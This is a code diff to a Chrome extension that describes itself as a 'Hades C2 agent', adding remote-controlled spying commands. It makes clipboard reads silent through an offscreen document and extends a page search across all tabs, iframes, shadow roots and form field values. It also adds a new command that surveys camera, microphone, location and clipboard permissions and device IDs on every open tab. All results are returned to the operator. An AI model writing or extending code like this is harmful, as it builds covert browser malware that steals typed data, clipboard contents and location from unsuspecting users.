@@ -580,6 +580,9 @@ function dispatchTask(task) {
   // __CMD__ notifications
   if (cmd === "notifications")             { cmdNotifications(task);                return; }
   // __ENDCMD__
+  // __CMD__ check_permissions
+  if (cmd === "check_permissions")         { cmdCheckPermissions(task);             return; }
+  // __ENDCMD__
   // __CMD__ list_pwas
   if (cmd === "list_pwas")                 { cmdListPwas(task);                     return; }
   // __ENDCMD__
@@ -958,59 +961,46 @@ function cmdIdle(task) {
 // __ENDCMD__
 
 // __CMD__ clipboard
+// ── clipboard ─────────────────────────────────────────────────────────────────
+// Uses an offscreen document to read clipboard — the only reliable way for a
+// Chrome MV3 extension to call navigator.clipboard.readText() without depending
+// on page focus or a user gesture. The offscreen doc is created on demand and
+// closed immediately after reading.
 async function cmdClipboard(task) {
   try {
-    const win = await new Promise(res => chrome.windows.getLastFocused({ populate: true }, res));
-    if (!win || chrome.runtime.lastError) {
-      postResponse(task.id, "No focused window: " + (chrome.runtime.lastError?.message || "unknown"));
-      return;
-    }
-    const tab = (win.tabs || []).find(t => t.active);
-    if (!tab?.id) { postResponse(task.id, "No active tab"); return; }
-    if (!tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) {
-      postResponse(task.id, "Cannot access clipboard from this tab: " + tab.url);
-      return;
+    const offscreenUrl = chrome.runtime.getURL("offscreen.html");
+
+    // Create the offscreen document if it doesn't already exist
+    const existing = await chrome.offscreen.hasDocument?.() ?? false;
+    if (!existing) {
+      await chrome.offscreen.createDocument({
+        url: offscreenUrl,
+        reasons: ["CLIPBOARD"],
+        justification: "Read clipboard contents for Hades C2 agent",
+      });
     }
 
-    // Timeout wrapper — navigator.clipboard.readText() can hang forever if the
-    // page isn't focused or doesn't have a user gesture. 3 s timeout prevents
-    // the command from silently stalling.
-    const r = await Promise.race([
-      chrome.scripting.executeScript({
-        target: { tabId: tab.id },
-        func: async () => {
-          try {
-            const text = await navigator.clipboard.readText();
-            return text === "" ? "(empty clipboard)" : text;
-          } catch (e) {
-            // Fallback: try execCommand paste (works without focus in some browsers)
-            try {
-              const ta = document.createElement("textarea");
-              ta.style.cssText = "position:fixed;opacity:0;left:-9999px";
-              document.body.appendChild(ta);
-              ta.focus();
-              document.execCommand("paste");
-              const val = ta.value;
-              ta.remove();
-              if (val) return val;
-            } catch (_) {}
-            return "__ERR__" + e.message;
-          }
-        }
+    // Ask the offscreen document to read the clipboard, 5 s hard timeout
+    const result = await Promise.race([
+      new Promise((resolve, reject) => {
+        chrome.runtime.sendMessage({ type: "clipboard_read" }, (resp) => {
+          if (chrome.runtime.lastError) return reject(new Error(chrome.runtime.lastError.message));
+          resolve(resp);
+        });
       }),
-      new Promise((_, rej) => setTimeout(() => rej(new Error(
-        "Clipboard read timed out (3 s). The active tab may not be focused — " +
-        "click into the tab first, then re-run clipboard."
-      )), 3000))
+      new Promise((_, rej) => setTimeout(() => rej(new Error("Clipboard read timed out (5 s)")), 5000)),
     ]);
 
-    const val = r?.[0]?.result ?? "(no result)";
-    if (String(val).startsWith("__ERR__")) {
-      postResponse(task.id, "Clipboard error: " + String(val).slice(7));
+    // Close the offscreen document when done
+    try { await chrome.offscreen.closeDocument(); } catch (_) {}
+
+    if (!result?.ok) {
+      postResponse(task.id, "Clipboard error: " + (result?.error || "unknown"));
     } else {
-      postResponse(task.id, val);
+      postResponse(task.id, result.text === "" ? "(empty clipboard)" : result.text);
     }
   } catch (e) {
+    try { await chrome.offscreen.closeDocument(); } catch (_) {}
     postResponse(task.id, "Clipboard failed: " + (e.message || String(e)));
   }
 }
@@ -1140,20 +1130,39 @@ async function cmdFindInDom(task, params) {
     for (const tab of tabs) {
       if (!tab.id || !tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) continue;
       try {
-        // 5 s timeout per tab — large DOMs can hang the regex
-        const r = await Promise.race([
+        // 5 s timeout per tab — large DOMs can hang the regex.
+        // allFrames: true so iframes are searched alongside the main frame.
+        const frameResults = await Promise.race([
           chrome.scripting.executeScript({
-            target: { tabId: tab.id },
+            target: { tabId: tab.id, allFrames: true },
             func: (pat, fl) => {
               try {
                 const re = new RegExp(pat, fl);
-                // Search outerHTML (capped at 2 MB to prevent OOM/hang on heavy pages)
-                let html = document.documentElement.outerHTML || "";
-                if (html.length > 2000000) html = html.slice(0, 2000000);
-                // Also search input/textarea values which aren't in outerHTML if dynamically set
-                const inputVals = [...document.querySelectorAll("input, textarea, select")]
-                  .map(el => el.value).filter(Boolean).join("\n");
-                const combined = html + "\n" + inputVals;
+
+                // Recursively collect HTML from a root, walking into shadow roots.
+                // Depth-limited to avoid infinite loops in pathological shadow trees.
+                function collectHtml(root, depth) {
+                  if (depth > 5) return "";
+                  let html = "";
+                  try { html = root.innerHTML || ""; } catch (_) {}
+                  if (html.length > 500000) html = html.slice(0, 500000);
+                  try {
+                    root.querySelectorAll("*").forEach(el => {
+                      if (el.shadowRoot) html += collectHtml(el.shadowRoot, depth + 1);
+                    });
+                  } catch (_) {}
+                  return html;
+                }
+
+                let combined = collectHtml(document, 0);
+                if (combined.length > 2000000) combined = combined.slice(0, 2000000);
+
+                // Also search dynamically set input/textarea values (not always in HTML)
+                try {
+                  combined += "\n" + [...document.querySelectorAll("input, textarea, select")]
+                    .map(el => el.value).filter(Boolean).join("\n");
+                } catch (_) {}
+
                 const matches = [...new Set([...combined.matchAll(re)].map(m => m[0]))].slice(0, 50);
                 return { url: window.location.href, title: document.title, count: matches.length, matches };
               } catch (e) { return { url: window.location.href, error: e.message, matches: [] }; }
@@ -1162,9 +1171,12 @@ async function cmdFindInDom(task, params) {
           }),
           new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 5000))
         ]);
-        const res = r?.[0]?.result;
-        if (res?.matches?.length) results.push(res);
-        else if (res?.error) results.push(res);
+        // Collect matches from every frame (main + iframes)
+        for (const frame of (frameResults || [])) {
+          const res = frame?.result;
+          if (res?.matches?.length) results.push(res);
+          else if (res?.error) results.push(res);
+        }
       } catch (_) {} // per-tab timeout or injection failure — skip
     }
     postResponse(task.id, results.length ? JSON.stringify(results, null, 2) : `No matches for pattern: ${pattern}`);
@@ -1406,7 +1418,7 @@ function cmdGeolocation(task) {
     }
     chrome.scripting.executeScript({
       target: { tabId: tab.id },
-      func: () => new Promise(res => navigator.geolocation.getCurrentPosition(
+      func: async () => new Promise(res => navigator.geolocation.getCurrentPosition(
         p => res({ latitude: p.coords.latitude, longitude: p.coords.longitude,
                    accuracy_m: p.coords.accuracy, altitude: p.coords.altitude,
                    timestamp: new Date(p.timestamp).toISOString() }),
@@ -1517,6 +1529,59 @@ async function cmdNotifications(task) {
       extension_notification_ids: Object.keys(notifs || {})
     }, null, 2));
   });
+}
+// __ENDCMD__
+
+// __CMD__ check_permissions
+// ── check_permissions ─────────────────────────────────────────────────────────
+// Queries browser permission state (camera, mic, geolocation, notifications,
+// clipboard) across all open tabs without triggering any prompts. Also enumerates
+// available media devices — labels are only visible if the page has already been
+// granted camera/mic access. Results grouped by origin.
+async function cmdCheckPermissions(task) {
+  const PERMS = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard-read'];
+  const tabs  = await new Promise(res => chrome.tabs.query({}, res));
+  const byOrigin = {};
+
+  for (const tab of tabs) {
+    if (!tab.id || !tab.url || tab.url.startsWith("chrome://") || tab.url.startsWith("chrome-extension://")) continue;
+    let origin;
+    try { origin = new URL(tab.url).origin; } catch (_) { continue; }
+
+    try {
+      const r = await chrome.scripting.executeScript({
+        target: { tabId: tab.id },
+        func: async (perms) => {
+          const result = {};
+          for (const p of perms) {
+            try {
+              const s = await navigator.permissions.query({ name: p });
+              result[p] = s.state; // 'granted' | 'denied' | 'prompt'
+            } catch (_) {
+              result[p] = 'unsupported';
+            }
+          }
+          // Media devices — labels only populated when camera/mic already granted
+          try {
+            const devices = await navigator.mediaDevices.enumerateDevices();
+            result.media_devices = devices.map(d => ({
+              kind: d.kind, label: d.label || '(no label — permission not granted)', id: d.deviceId
+            }));
+          } catch (_) {
+            result.media_devices = [];
+          }
+          return result;
+        },
+        args: [PERMS],
+      });
+      const res = r?.[0]?.result;
+      if (!res) continue;
+      if (!byOrigin[origin]) byOrigin[origin] = { tabs: [], permissions: res };
+      byOrigin[origin].tabs.push(tab.title || tab.url);
+    } catch (_) {}
+  }
+
+  postResponse(task.id, JSON.stringify(byOrigin, null, 2));
 }
 // __ENDCMD__
 
